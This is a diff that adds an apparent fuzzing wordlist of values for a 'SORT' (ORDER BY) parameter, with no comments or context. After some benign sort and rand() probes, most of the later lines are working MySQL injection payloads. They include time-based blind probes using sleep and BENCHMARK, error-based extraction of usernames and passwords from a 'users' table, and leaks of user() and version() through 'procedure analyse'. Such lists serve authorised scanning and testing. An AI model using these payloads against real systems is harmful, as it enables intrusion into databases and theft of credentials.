@@ -1,0 +1,30 @@
+SORT:desc
+SORT:1 desc
+SORT:1 asc
+SORT:1
+SORT:1 asc
+SORT:1 desc
+SORT:1 asc
+SORT:1 asc
+SORT:rand(true)
+SORT:rand(true)
+SORT:rand(true)
+SORT:rand(false)
+SORT:rand(false)
+SORT:rand(true)
+SORT:1 and sleep(1)
+SORT:1 or sleep(1)
+SORT:1 or sleep(2)
+SORT:1 and sleep(2)
+SORT:1
+SORT:rand(true)
+SORT:rand(true)
+SORT:1 and sleep(1)
+SORT:1 and sleep(0.1)
+SORT:1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)
+SORT:(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+SORT: (SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)
+SORT:1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+SORT:1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+SORT:1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+SORT:1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
